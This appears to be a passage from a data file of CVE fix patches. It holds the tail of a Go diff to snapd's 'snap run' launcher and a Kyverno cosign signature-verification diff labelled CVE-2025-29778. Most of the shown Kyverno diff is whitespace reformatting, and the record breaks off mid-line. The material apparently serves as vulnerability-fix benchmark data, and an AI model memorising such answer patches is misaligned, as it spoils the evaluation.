{\n+                logger.Noticef(\"WARNING: cannot copy user Xauthority file: %s\", err)\n+        }\n+\n+        if err := activateXdgDocumentPortal(info, snapApp, hook); err != nil {\n+                logger.Noticef(\"WARNING: cannot start document portal: %s\", err)\n+        }\n+\n+        cmd := []string{snapConfine}\n+        if info.NeedsClassic() {\n+                cmd = append(cmd, \"--classic\")\n+        }\n+\n+        // this should never happen since we validate snaps with \"base: none\" and do not allow hooks/apps\n+        if info.Base == \"none\" {\n+                return fmt.Errorf(`cannot run hooks / applications with base \"none\"`)\n+        }\n+        if info.Base != \"\" {\n+                cmd = append(cmd, \"--base\", info.Base)\n+        } else {\n+                if info.Type() == snap.TypeKernel {\n+                        // kernels have no explicit base, we use the boot base\n+                        modelAssertion, err := x.client.CurrentModelAssertion()\n+                        if err != nil {\n+                                if hook != \"\" {\n+                                        return fmt.Errorf(\"cannot get model assertion to setup kernel hook run: %v\", err)\n+                                } else {\n+                                        return fmt.Errorf(\"cannot get model assertion to setup kernel app run: %v\", err)\n+                                }\n+                        }\n+                        modelBase := modelAssertion.Base()\n+                        if modelBase != \"\" {\n+                                cmd = append(cmd, \"--base\", modelBase)\n+                        }\n+                }\n+        }\n+        cmd = append(cmd, securityTag)\n+\n+        // when under confinement, snap-exec is run from 'core' snap rootfs\n+        snapExecPath := filepath.Join(dirs.CoreLibExecDir, \"snap-exec\")\n+\n+        if info.NeedsClassic() {\n+                // running with classic confinement, carefully pick snap-exec we\n+                // are going to use\n+                snapExecPath, err = snapdHelperPath(\"snap-exec\")\n+                if err != nil {\n+                        return err\n+                }\n+        }\n+        cmd = append(cmd, snapExecPath)\n+\n+        if x.Shell {\n+                cmd = append(cmd, \"--command=shell\")\n+        }\n+        if x.Gdb {\n+                cmd = append(cmd, \"--command=gdb\")\n+        }\n+        if x.useGdbserver() {\n+                cmd = append(cmd, \"--command=gdbserver\")\n+        }\n+        if x.Command != \"\" {\n+                cmd = append(cmd, \"--command=\"+x.Command)\n+        }\n+\n+        if hook != \"\" {\n+                cmd = append(cmd, \"--hook=\"+hook)\n+        }\n+\n+        // snap-exec is POSIXly-- options must come before positionals.\n+        cmd = append(cmd, snapApp)\n+        cmd = append(cmd, args...)\n+\n+        env, err := osutil.OSEnvironment()\n+        if err != nil {\n+                return err\n+        }\n+        snapenv.ExtendEnvForRun(env, info)\n+\n+        if len(xauthPath) > 0 {\n+                // Environment is not nil here because it comes from\n+                // osutil.OSEnvironment and that guarantees this\n+                // property.\n+                env[\"XAUTHORITY\"] = xauthPath\n+        }\n+\n+        // on each run variant path this will be used once to get\n+        // the environment plus additions in the right form\n+        envForExec := func(extra map[string]string) []string {\n+                for varName, value := range extra {\n+                        env[varName] = value\n+                }\n+                if !info.NeedsClassic() {\n+                        return env.ForExec()\n+                }\n+                // For a classic snap, environment variables that are\n+                // usually stripped out by ld.so when starting a\n+                // setuid process are presevered by being renamed by\n+                // prepending PreservedUnsafePrefix -- which snap-exec\n+                // will remove, restoring the variables to their\n+                // original names.\n+                return env.ForExecEscapeUnsafe(snapenv.PreservedUnsafePrefix)\n+        }\n+\n+        // Systemd automatically places services under a unique cgroup encoding the\n+        // security tag, but for apps and hooks we need to create a transient scope\n+        // with similar purpose ourselves.\n+        //\n+        // The way this happens is as follows:\n+        //\n+        // 1) Services are implemented using systemd service units. Starting a\n+        // unit automatically places it in a cgroup named after the service unit\n+        // name. Snapd controls the name of the service units thus indirectly\n+        // controls the cgroup name.\n+        //\n+        // 2) Non-services, including hooks, are started inside systemd\n+        // transient scopes. Scopes are a systemd unit type that are defined\n+        // programmatically and are meant for groups of processes started and\n+        // stopped by an _arbitrary process_ (ie, not systemd). Systemd\n+        // requires that each scope is given a unique name. We employ a scheme\n+        // where random UUID is combined with the name of the security tag\n+        // derived from snap application or hook name. Multiple concurrent\n+        // invocations of \"snap run\" will use distinct UUIDs.\n+        //\n+        // Transient scopes allow launched snaps to integrate into\n+        // the systemd design. See:\n+        // https://www.freedesktop.org/wiki/Software/systemd/ControlGroupInterface/\n+        //\n+        // Programs running as root, like system-wide services and programs invoked\n+        // using tools like sudo are placed under system.slice. Programs running as\n+        // a non-root user are placed under user.slice, specifically in a scope\n+        // specific to a logind session.\n+        //\n+        // This arrangement allows for proper accounting and control of resources\n+        // used by snap application processes of each type.\n+        //\n+        // For more information about systemd cgroups, including unit types, see:\n+        // https://www.freedesktop.org/wiki/Software/systemd/ControlGroupInterface/\n+        _, appName := snap.SplitSnapApp(snapApp)\n+        needsTracking := true\n+        if app := info.Apps[appName]; hook == \"\" && app != nil && app.IsService() {\n+                // If we are running a service app then we do not need to use\n+                // application tracking. Services, both in the system and user scope,\n+                // do not need tracking because systemd already places them in a\n+                // tracking cgroup, named after the systemd unit name, and those are\n+                // sufficient to identify both the snap name and the app name.\n+                needsTracking = false\n+        }\n+        // Allow using the session bus for all apps but not for hooks.\n+        allowSessionBus := hook == \"\"\n+        // Track, or confirm existing tracking from systemd.\n+        var trackingErr error\n+        if needsTracking {\n+                opts := &cgroup.TrackingOptions{AllowSessionBus: allowSessionBus}\n+                trackingErr = cgroupCreateTransientScopeForTracking(securityTag, opts)\n+        } else {\n+                trackingErr = cgroupConfirmSystemdServiceTracking(securityTag)\n+        }\n+        if trackingErr != nil {\n+                if trackingErr != cgroup.ErrCannotTrackProcess {\n+                        return trackingErr\n+                }\n+                // If we cannot track the process then log a debug message.\n+                // TODO: if we could, create a warning. Currently this is not possible\n+                // because only snapd can create warnings, internally.\n+                logger.Debugf(\"snapd cannot track the started application\")\n+                logger.Debugf(\"snap refreshes will not be postponed by this process\")\n+        }\n+        if x.TraceExec {\n+                return x.runCmdWithTraceExec(cmd, envForExec)\n+        } else if x.Gdb {\n+                return x.runCmdUnderGdb(cmd, envForExec)\n+        } else if x.useGdbserver() {\n+                if _, err := exec.LookPath(\"gdbserver\"); err != nil {\n+                        // TODO: use xerrors.Is(err, exec.ErrNotFound) once\n+                        // we moved off from go-1.9\n+                        if execErr, ok := err.(*exec.Error); ok {\n+                                if execErr.Err == exec.ErrNotFound {\n+                                        return fmt.Errorf(\"please install gdbserver on your system\")\n+                                }\n+                        }\n+                        return err\n+                }\n+                return x.runCmdUnderGdbserver(cmd, envForExec)\n+        } else if x.useStrace() {\n+                return x.runCmdUnderStrace(cmd, envForExec)\n+        } else {\n+                return syscallExec(cmd[0], cmd, envForExec(nil))\n+        }\n }\n \n var cgroupCreateTransientScopeForTracking = cgroup.CreateTransientScopeForTracking\n"}
{"cve":"CVE-2025-29778:0708", "fix_patch": "diff --git a/pkg/cosign/cosign.go b/pkg/cosign/cosign.go\nindex 60ca41696..86188770e 100644\n--- a/pkg/cosign/cosign.go\n+++ b/pkg/cosign/cosign.go\n@@ -1,720 +1,720 @@\n package cosign\n \n import (\n-\t\"bytes\"\n-\t\"context\"\n-\t\"crypto\"\n-\t\"crypto/x509\"\n-\t\"encoding/base64\"\n-\t\"encoding/json\"\n-\t\"fmt\"\n-\t\"regexp\"\n-\t\"strings\"\n-\n-\t\"github.com/google/go-containerregistry/pkg/name\"\n-\t\"github.com/in-toto/in-toto-golang/in_toto\"\n-\t\"github.com/kyverno/kyverno/ext/wildcard\"\n-\t\"github.com/kyverno/kyverno/pkg/images\"\n-\t\"github.com/kyverno/kyverno/pkg/tracing\"\n-\tdatautils \"github.com/kyverno/kyverno/pkg/utils/data\"\n-\t\"github.com/sigstore/cosign/v2/pkg/cosign\"\n-\t\"github.com/sigstore/cosign/v2/pkg/cosign/attestation\"\n-\t\"github.com/sigstore/cosign/v2/pkg/oci\"\n-\t\"github.com/sigstore/cosign/v2/pkg/oci/remote\"\n-\tsigs \"github.com/sigstore/cosign/v2/pkg/signature\"\n-\trekorclient \"github.com/sigstore/rekor/pkg/client\"\n-\t\"github.com/sigstore/sigstore/pkg/cryptoutils\"\n-\t\"github.com/sigstore/sigstore/pkg/fulcioroots\"\n-\t\"github.com/sigstore/sigstore/pkg/signature\"\n-\t\"github.com/sigstore/sigstore/pkg/signature/payload\"\n-\t\"github.com/sigstore/sigstore/pkg/tuf\"\n-\t\"go.opentelemetry.io/otel/trace\"\n-\t\"go.uber.org/multierr\"\n+        \"bytes\"\n+        \"context\"\n+        \"crypto\"\n+        \"crypto/x509\"\n+        \"encoding/base64\"\n+        \"encoding/json\"\n+        \"fmt\"\n+        \"regexp\"\n+        \"strings\"\n+\n+        \"github.com/google/go-containerregistry/pkg/name\"\n+        \"github.com/in-toto/in-toto-golang/in_toto\"\n+        \"github.com/kyverno/kyverno/ext/wildcard\"\n+        \"github.com/kyverno/kyverno/pkg/images\"\n+        \"github.com/kyverno/kyverno/pkg/tracing\"\n+        datautils \"github.com/kyverno/kyverno/pkg/utils/data\"\n+        \"github.com/sigstore/cosign/v2/pkg/cosign\"\n+        \"github.com/sigstore/cosign/v2/pkg/cosign/attestation\"\n+        \"github.com/sigstore/cosign/v2/pkg/oci\"\n+        \"github.com/sigstore/cosign/v2/pkg/oci/remote\"\n+        sigs \"github.com/sigstore/cosign/v2/pkg/signature\"\n+        rekorclient \"github.com/sigstore/rekor/pkg/client\"\n+        \"github.com/sigstore/sigstore/pkg/cryptoutils\"\n+        \"github.com/sigstore/sigstore/pkg/fulcioroots\"\n+        \"github.com/sigstore/sigstore/pkg/signature\"\n+        \"github.com/sigstore/sigstore/pkg/signature/payload\"\n+        \"github.com/sigstore/sigstore/pkg/tuf\"\n+        \"go.opentelemetry.io/otel/trace\"\n+        \"go.uber.org/multierr\"\n )\n \n var signatureAlgorithmMap = map[string]crypto.Hash{\n-\t\"\":       crypto.SHA256,\n-\t\"sha224\": crypto.SHA224,\n-\t\"sha256\": crypto.SHA256,\n-\t\"sha384\": crypto.SHA384,\n-\t\"sha512\": crypto.SHA512,\n+        \"\":       crypto.SHA256,\n+        \"sha224\": crypto.SHA224,\n+        \"sha256\": crypto.SHA256,\n+        \"sha384\": crypto.SHA384,\n+        \"sha512\": crypto.SHA512,\n }\n \n func NewVerifier() images.ImageVerifier {\n-\treturn &cosignVerifier{}\n+        return &cosignVerifier{}\n }\n \n type cosignVerifier struct{}\n \n func (v *cosignVerifier) VerifySignature(ctx context.Context, opts images.Options) (*images.Response, error) {\n-\tif opts.SigstoreBundle {\n-\t\tresults, err := verifyBundleAndFetchAttestations(ctx, opts)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\n-\t\tif len(results) == 0 {\n-\t\t\treturn nil, fmt.Errorf(\"sigstore bundle verification failed: no matching signatures found\")\n-\t\t}\n-\n-\t\treturn &images.Response{Digest: results[0].Desc.Digest.String()}, nil\n-\t}\n-\n-\tnameOpts := opts.Client.NameOptions()\n-\tref, err := name.ParseReference(opts.ImageRef, nameOpts...)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"failed to parse image %s\", opts.ImageRef)\n-\t}\n-\n-\tsignatures, bundleVerified, err := tracing.ChildSpan3(\n-\t\tctx,\n-\t\t\"\",\n-\t\t\"VERIFY IMG SIGS\",\n-\t\tfunc(ctx context.Context, span trace.Span) ([]oci.Signature, bool, error) {\n-\t\t\tcosignOpts, err := buildCosignOptions(ctx, opts)\n-\t\t\tif err != nil {\n-\t\t\t\treturn nil, false, err\n-\t\t\t}\n-\t\t\treturn client.VerifyImageSignatures(ctx, ref, cosignOpts)\n-\t\t},\n-\t)\n-\tif err != nil {\n-\t\tlogger.Info(\"image verification failed\", \"error\", err.Error())\n-\t\treturn nil, err\n-\t}\n-\n-\tlogger.V(3).Info(\"verified image\", \"count\", len(signatures), \"bundleVerified\", bundleVerified)\n-\tpayload, err := extractPayload(signatures)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tif err := matchSignatures(signatures, opts.Subject, opts.SubjectRegExp, opts.Issuer, opts.IssuerRegExp, opts.AdditionalExtensions); err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\terr = checkAnnotations(payload, opts.Annotations)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tvar digest string\n-\tif opts.Type == \"\" {\n-\t\tdigest, err = extractDigest(opts.ImageRef, payload)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t}\n-\n-\treturn &images.Response{Digest: digest}, nil\n+        if opts.SigstoreBundle {\n+                results, err := verifyBundleAndFetchAttestations(ctx, opts)\n+                if err != nil {\n+                        return nil, err\n+                }\n+\n+                if len(results) == 0 {\n+                        return nil, fmt.Errorf(\"sigstore bundle verification failed: no matching signatures found\")\n+                }\n+\n+                return &images.Response{Digest: results[0].Desc.Digest.String()}, nil\n+        }\n+\n+        nameOpts := opts.Client.NameOptions()\n+        ref, err := name.ParseReference(opts.ImageRef, nameOpts...)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"failed to parse image %s\", opts.ImageRef)\n+        }\n+\n+        signatures, bundleVerified, err := tracing.ChildSpan3(\n+                ctx,\n+                \"\",\n+                \"VERIFY IMG SIGS\",\n+                func(ctx context.Context, span trace.Span) ([]oci.Signature, bool, error) {\n+                        cosignOpts, err := buildCosignOptions(ctx, opts)\n+                        if err != nil {\n+                                return nil, false, err\n+                        }\n+                        return client.VerifyImageSignatures(ctx, ref, cosignOpts)\n+                },\n+        )\n+        if err != nil {\n+                logger.Info(\"image verification failed\", \"error\", err.Error())\n+                return nil, err\n+        }\n+\n+        logger.V(3).Info(\"verified image\", \"count\", len(signatures), \"bundleVerified\", bundleVerified)\n+        payload, err := extractPayload(signatures)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        if err := matchSignatures(signatures, opts.Subject, opts.SubjectRegExp, opts.Issuer, opts.IssuerRegExp, opts.AdditionalExtensions); err != nil {\n+                return nil, err\n+        }\n+\n+        err = checkAnnotations(payload, opts.Annotations)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        var digest string\n+        if opts.Type == \"\" {\n+                digest, err = extractDigest(opts.ImageRef, payload)\n+                if err != nil {\n+                        return nil, err\n+                }\n+        }\n+\n+        return &images.Response{Digest: digest}, nil\n }\n \n func buildCosignOptions(ctx context.Context, opts images.Options) (*cosign.CheckOpts, error) {\n-\tvar err error\n-\n-\toptions, err := opts.Client.Options(ctx)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"constructing cosign remote options: %w\", err)\n-\t}\n-\n-\tcosignOpts := &cosign.CheckOpts{\n-\t\tAnnotations:        map[string]interface{}{},\n-\t\tRegistryClientOpts: []remote.Option{remote.WithRemoteOptions(options...)},\n-\t}\n-\n-\tif opts.FetchAttestations {\n-\t\tcosignOpts.ClaimVerifier = cosign.IntotoSubjectClaimVerifier\n-\t} else {\n-\t\tcosignOpts.ClaimVerifier = cosign.SimpleClaimVerifier\n-\t}\n-\n-\tif opts.Roots != \"\" {\n-\t\tcp, err := loadCertPool([]byte(opts.Roots))\n-\t\tif err != nil {\n-\t\t\treturn nil, fmt.Errorf(\"failed to load Root certificates: %w\", err)\n-\t\t}\n-\t\tcosignOpts.RootCerts = cp\n-\t}\n-\n-\tsignatureAlgorithm, ok := signatureAlgorithmMap[opts.SignatureAlgorithm]\n-\tif !ok {\n-\t\treturn nil, fmt.Errorf(\"invalid signature algorithm provided %s\", opts.SignatureAlgorithm)\n-\t}\n-\n-\tif opts.Key != \"\" {\n-\t\tif strings.HasPrefix(strings.TrimSpace(opts.Key), \"-----BEGIN PUBLIC KEY-----\") {\n-\t\t\tcosignOpts.SigVerifier, err = decodePEM([]byte(opts.Key), signatureAlgorithm)\n-\t\t\tif err != nil {\n-\t\t\t\treturn nil, fmt.Errorf(\"failed to load public key from PEM: %w\", err)\n-\t\t\t}\n-\t\t} else {\n-\t\t\t// this supports Kubernetes secrets and KMS\n-\t\t\tcosignOpts.SigVerifier, err = sigs.PublicKeyFromKeyRefWithHashAlgo(ctx, opts.Key, signatureAlgorithm)\n-\t\t\tif err != nil {\n-\t\t\t\treturn nil, fmt.Errorf(\"failed to load public key from %s: %w\", opts.Key, err)\n-\t\t\t}\n-\t\t}\n-\t} else {\n-\t\tif opts.Cert != \"\" {\n-\t\t\t// load cert and optionally a cert chain as a verifier\n-\t\t\tcert, err := loadCert([]byte(opts.Cert))\n-\t\t\tif err != nil {\n-\t\t\t\treturn nil, fmt.Errorf(\"failed to load certificate from %s: %w\", opts.Cert, err)\n-\t\t\t}\n-\n-\t\t\tif opts.CertChain == \"\" {\n-\t\t\t\tcosignOpts.SigVerifier, err = signature.LoadVerifier(cert.PublicKey, signatureAlgorithm)\n-\t\t\t\tif err != nil {\n-\t\t\t\t\treturn nil, fmt.Errorf(\"failed to load signature from certificate: %w\", err)\n-\t\t\t\t}\n-\t\t\t} else {\n-\t\t\t\t// Verify certificate with chain\n-\t\t\t\tchain, err := loadCertChain([]byte(opts.CertChain))\n-\t\t\t\tif err != nil {\n-\t\t\t\t\treturn nil, fmt.Errorf(\"failed to load load certificate chain: %w\", err)\n-\t\t\t\t}\n-\t\t\t\tcosignOpts.SigVerifier, err = cosign.ValidateAndUnpackCertWithChain(cert, chain, cosignOpts)\n-\t\t\t\tif err != nil {\n-\t\t\t\t\treturn nil, fmt.Errorf(\"failed to load validate certificate chain: %w\", err)\n-\t\t\t\t}\n-\t\t\t}\n-\t\t} else if opts.CertChain != \"\" {\n-\t\t\t// load cert chain as roots\n-\t\t\tcp, err := loadCertPool([]byte(opts.CertChain))\n-\t\t\tif err != nil {\n-\t\t\t\treturn nil, fmt.Errorf(\"failed to load certificates: %w\", err)\n-\t\t\t}\n-\t\t\tcosignOpts.RootCerts = cp\n-\t\t} else {\n-\t\t\t// if key, cert, and roots are not provided, default to Fulcio roots\n-\t\t\tif cosignOpts.RootCerts == nil {\n-\t\t\t\troots, err := fulcioroots.Get()\n-\t\t\t\tif err != nil {\n-\t\t\t\t\treturn nil, fmt.Errorf(\"failed to get roots from fulcio: %w\", err)\n-\t\t\t\t}\n-\t\t\t\tcosignOpts.RootCerts = roots\n-\t\t\t\tif cosignOpts.RootCerts == nil {\n-\t\t\t\t\treturn nil, fmt.Errorf(\"failed to initialize roots\")\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\tcosignOpts.IgnoreTlog = opts.IgnoreTlog\n-\tif !opts.IgnoreTlog {\n-\t\tcosignOpts.RekorClient, err = rekorclient.GetRekorClient(opts.RekorURL)\n-\t\tif err != nil {\n-\t\t\treturn nil, fmt.Errorf(\"failed to create Rekor client from URL %s: %w\", opts.RekorURL, err)\n-\t\t}\n-\n-\t\tcosignOpts.RekorPubKeys, err = getRekorPubs(ctx, opts.RekorPubKey)\n-\t\tif err != nil {\n-\t\t\treturn nil, fmt.Errorf(\"failed to load Rekor public keys: %w\", err)\n-\t\t}\n-\t}\n-\n-\tcosignOpts.IgnoreSCT = opts.IgnoreSCT\n-\tif !opts.IgnoreSCT {\n-\t\tcosignOpts.CTLogPubKeys, err = getCTLogPubs(ctx, opts.CTLogsPubKey)\n-\t\tif err != nil {\n-\t\t\treturn nil, fmt.Errorf(\"failed to load CTLogs public keys: %w\", err)\n-\t\t}\n-\t}\n-\n-\tif opts.Repository != \"\" {\n-\t\tsignatureRepo, err := name.NewRepository(opts.Repository)\n-\t\tif err != nil {\n-\t\t\treturn nil, fmt.Errorf(\"failed to parse signature repository %s: %w\", opts.Repository, err)\n-\t\t}\n-\n-\t\tcosignOpts.RegistryClientOpts = append(cosignOpts.RegistryClientOpts, remote.WithTargetRepository(signatureRepo))\n-\t}\n-\n-\tif opts.TSACertChain != \"\" {\n-\t\tleaves, intermediates, roots, err := splitPEMCertificateChain([]byte(opts.TSACertChain))\n-\t\tif err != nil {\n-\t\t\treturn nil, fmt.Errorf(\"error splitting tsa certificates: %w\", err)\n-\t\t}\n-\t\tif len(leaves) > 1 {\n-\t\t\treturn nil, fmt.Errorf(\"certificate chain must contain at most one TSA certificate\")\n-\t\t}\n-\t\tif len(leaves) == 1 {\n-\t\t\tcosignOpts.TSACertificate = leaves[0]\n-\t\t}\n-\t\tcosignOpts.TSAIntermediateCertificates = intermediates\n-\t\tcosignOpts.TSARootCertificates = roots\n-\t}\n-\n-\tcosignOpts.ExperimentalOCI11 = opts.CosignOCI11\n-\treturn cosignOpts, nil\n+        var err error\n+\n+        options, err := opts.Client.Options(ctx)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"constructing cosign remote options: %w\", err)\n+        }\n+\n+        cosignOpts := &cosign.CheckOpts{\n+                Annotations:        map[string]interface{}{},\n+                RegistryClientOpts: []remote.Option{remote.WithRemoteOptions(options...)},\n+        }\n+\n+        if opts.FetchAttestations {\n+                cosignOpts.ClaimVerifier = cosign.IntotoSubjectClaimVerifier\n+        } else {\n+                cosignOpts.ClaimVerifier = cosign.SimpleClaimVerifier\n+        }\n+\n+        if opts.Roots != \"\" {\n+                cp, err := loadCertPool([]byte(opts.Roots))\n+                if err != nil {\n+                        return nil, fmt.Errorf(\"failed to load Root certificates: %w\", err)\n+                }\n+                cosignOpts.RootCerts = cp\n+        }\n+\n+        signatureAlgorithm, ok := signatureAlgorithmMap[opts.SignatureAlgorithm]\n+        if !ok {\n+                return nil, fmt.Errorf(\"invalid signature algorithm provided %s\", opts.SignatureAlgorithm)\n+        }\n+\n+        if opts.Key != \"\" {\n+                if strings.HasPrefix(strings.TrimSpace(opts.Key), \"-----BEGIN PUBLIC KEY-----\") {\n+                        cosignOpts.SigVerifier, err = decodePEM([]byte(opts.Key), signatureAlgorithm)\n+                        if err != nil {\n+                                return nil, fmt.Errorf(\"failed to load public key from PEM: %w\", err)\n+                        }\n+                } else {\n+                        // this supports Kubernetes secrets and KMS\n+                        cosignOpts.SigVerifier, err = sigs.PublicKeyFromKeyRefWithHashAlgo(ctx, opts.Key, signatureAlgorithm)\n+                        if err != nil {\n+                                return nil, fmt.Errorf(\"failed to load public key from %s: %w\", opts.Key, err)\n+                        }\n+                }\n+        } else {\n+                if opts.Cert != \"\" {\n+                        // load cert and optionally a cert chain as a verifier\n+                        cert, err := loadCert([]byte(opts.Cert))\n+                        if err != nil {\n+                                return nil, fmt.Errorf(\"failed to load certificate from %s: %w\", opts.Cert, err)\n+                        }\n+\n+                        if opts.CertChain == \"\" {\n+                                cosignOpts.SigVerifier, err = signature.LoadVerifier(cert.PublicKey, signatureAlgorithm)\n+                                if err != nil {\n+                                        return nil, fmt.Errorf(\"failed to load signature from certificate: %w\", err)\n+                                }\n+                        } else {\n+                                // Verify certificate with chain\n+                                chain, err := loadCertChain([]byte(opts.CertChain))\n+                                if err != nil {\n+                                        return nil, fmt.Errorf(\"failed to load load certificate chain: %w\", err)\n+                                }\n+                                cosignOpts.SigVerifier, err = cosign.ValidateAndUnpackCertWithChain(cert, chain, cosignOpts)\n+                                if err != nil {\n+                                        return nil, fmt.Errorf(\"failed to load validate certificate chain: %w\", err)\n+                                }\n+                        }\n+                } else if opts.CertChain != \"\" {\n+                        // load cert chain as roots\n+                        cp, err := loadCertPool([]byte(opts.CertChain))\n+                        if err != nil {\n+                                return nil, fmt.Errorf(\"failed to load certificates: %w\", err)\n+                        }\n+                        cosignOpts.RootCerts = cp\n+                } else {\n+                        // if key, cert, and roots are not provided, default to Fulcio roots\n+                        if cosignOpts.RootCerts == nil {\n+                                roots, err := fulcioroots.Get()\n+                                if err != nil {\n+                                        return nil, fmt.Errorf(\"failed to get roots from fulcio: %w\", err)\n+                                }\n+                                cosignOpts.RootCerts = roots\n+                                if cosignOpts.RootCerts == nil {\n+                                        return nil, fmt.Errorf(\"failed to initialize roots\")\n+                                }\n+                        }\n+                }\n+        }\n+\n+        cosignOpts.IgnoreTlog = opts.IgnoreTlog\n+        if !opts.IgnoreTlog {\n+                cosignOpts.RekorClient, err = rekorclient.GetRekorClient(opts.RekorURL)\n+                if err != nil {\n+                        return nil, fmt.Errorf(\"failed to create Rekor client from URL %s: %w\", opts.RekorURL, err)\n+                }\n+\n+                cosignOpts.RekorPubKeys, err = getRekorPubs(ctx, opts.RekorPubKey)\n+                if err != nil {\n+                        return nil, fmt.Errorf(\"failed to load Rekor public keys: %w\", err)\n+                }\n+        }\n+\n+        cosignOpts.IgnoreSCT = opts.IgnoreSCT\n+        if !opts.IgnoreSCT {\n+                cosignOpts.CTLogPubKeys, err = getCTLogPubs(ctx, opts.CTLogsPubKey)\n+                if err != nil {\n+                        return nil, fmt.Errorf(\"failed to load CTLogs public keys: %w\", err)\n+                }\n+        }\n+\n+        if opts.Repository != \"\" {\n+                signatureRepo, err := name.NewRepository(opts.Repository)\n+                if err != nil {\n+                        return nil, fmt.Errorf(\"failed to parse signature repository %s: %w\", opts.Repository, err)\n+                }\n+\n+                cosignOpts.RegistryClientOpts = append(cosignOpts.RegistryClientOpts, remote.WithTargetRepository(signatureRepo))\n+        }\n+\n+        if opts.TSACertChain != \"\" {\n+                leaves, intermediates, roots, err := splitPEMCertificateChain([]byte(opts.TSACertChain))\n+                if err != nil {\n+                        return nil, fmt.Errorf(\"error splitting tsa certificates: %w\", err)\n+                }\n+                if len(leaves) > 1 {\n+                        return nil, fmt.Errorf(\"certificate chain must contain at most one TSA certificate\")\n+                }\n+                if len(leaves) == 1 {\n+                        cosignOpts.TSACertificate = leaves[0]\n+                }\n+                cosignOpts.TSAIntermediateCertificates = intermediates\n+                cosignOpts.TSARootCertificates = roots\n+        }\n+\n+        cosignOpts.ExperimentalOCI11 = opts.CosignOCI11\n+        return cosignOpts, nil\n }\n \n func loadCertPool(roots []byte) (*x509.CertPool, error) {\n-\tcp := x509.NewCertPool()\n-\tif !cp.AppendCertsFromPEM(roots) {\n-\t\treturn nil, fmt.Errorf(\"error creating root cert pool\")\n-\t}\n+        cp := x509.NewCertPool()\n+        if !cp.AppendCertsFromPEM(roots) {\n+                return nil, fmt.Errorf(\"error creating root cert pool\")\n+        }\n \n-\treturn cp, nil\n+        return cp, nil\n }\n \n func loadCert(pem []byte) (*x509.Certificate, error) {\n-\tvar out []byte\n-\tout, err := base64.StdEncoding.DecodeString(string(pem))\n-\tif err != nil {\n-\t\t// not a base64\n-\t\tout = pem\n-\t}\n-\n-\tcerts, err := cryptoutils.UnmarshalCertificatesFromPEM(out)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"failed to unmarshal certificate from PEM format: %w\", err)\n-\t}\n-\tif len(certs) == 0 {\n-\t\treturn nil, fmt.Errorf(\"no certs found in pem file\")\n-\t}\n-\treturn certs[0], nil\n+        var out []byte\n+        out, err := base64.StdEncoding.DecodeString(string(pem))\n+        if err != nil {\n+                // not a base64\n+                out = pem\n+        }\n+\n+        certs, err := cryptoutils.UnmarshalCertificatesFromPEM(out)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"failed to unmarshal certificate from PEM format: %w\", err)\n+        }\n+        if len(certs) == 0 {\n+                return nil, fmt.Errorf(\"no certs found in pem file\")\n+        }\n+        return certs[0], nil\n }\n \n func loadCertChain(pem []byte) ([]*x509.Certificate, error) {\n-\treturn cryptoutils.LoadCertificatesFromPEM(bytes.NewReader(pem))\n+        return cryptoutils.LoadCertificatesFromPEM(bytes.NewReader(pem))\n }\n \n func (v *cosignVerifier) FetchAttestations(ctx context.Context, opts images.Options) (*images.Response, error) {\n-\tif opts.SigstoreBundle {\n-\t\tresults, err := verifyBundleAndFetchAttestations(ctx, opts)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\n-\t\tif len(results) == 0 {\n-\t\t\treturn nil, fmt.Errorf(\"sigstore bundle verification failed: no matching signatures found\")\n-\t\t}\n-\n-\t\tstatements, err := decodeStatementsFromBundles(results)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\treturn &images.Response{Digest: results[0].Desc.Digest.String(), Statements: statements}, nil\n-\t}\n-\tcosignOpts, err := buildCosignOptions(ctx, opts)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tnameOpts := opts.Client.NameOptions()\n-\tsignatures, bundleVerified, err := tracing.ChildSpan3(\n-\t\tctx,\n-\t\t\"\",\n-\t\t\"VERIFY IMG ATTESTATIONS\",\n-\t\tfunc(ctx context.Context, span trace.Span) (checkedAttestations []oci.Signature, bundleVerified bool, err error) {\n-\t\t\tref, err := name.ParseReference(opts.ImageRef, nameOpts...)\n-\t\t\tif err != nil {\n-\t\t\t\treturn nil, false, fmt.Errorf(\"failed to parse image: %w\", err)\n-\t\t\t}\n-\t\t\treturn client.VerifyImageAttestations(ctx, ref, cosignOpts)\n-\t\t},\n-\t)\n-\tif err != nil {\n-\t\tmsg := err.Error()\n-\t\tlogger.Info(\"failed to fetch attestations\", \"error\", msg)\n-\t\tif strings.Contains(msg, \"MANIFEST_UNKNOWN: manifest unknown\") {\n-\t\t\treturn nil, fmt.Errorf(\"not found\")\n-\t\t}\n-\n-\t\treturn nil, err\n-\t}\n-\n-\tpayload, err := extractPayload(signatures)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tfor _, signature := range signatures {\n-\t\tmatch, predicateType, err := matchType(signature, opts.Type)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\n-\t\tif !match {\n-\t\t\tlogger.V(4).Info(\"type doesn't match, continue\", \"expected\", opts.Type, \"received\", predicateType)\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\tif err := matchSignatures([]oci.Signature{signature}, opts.Subject, opts.SubjectRegExp, opts.Issuer, opts.IssuerRegExp, opts.AdditionalExtensions); err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t}\n-\n-\terr = checkAnnotations(payload, opts.Annotations)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tlogger.V(3).Info(\"verified images\", \"signatures\", len(signatures), \"bundleVerified\", bundleVerified)\n-\tinTotoStatements, digest, err := 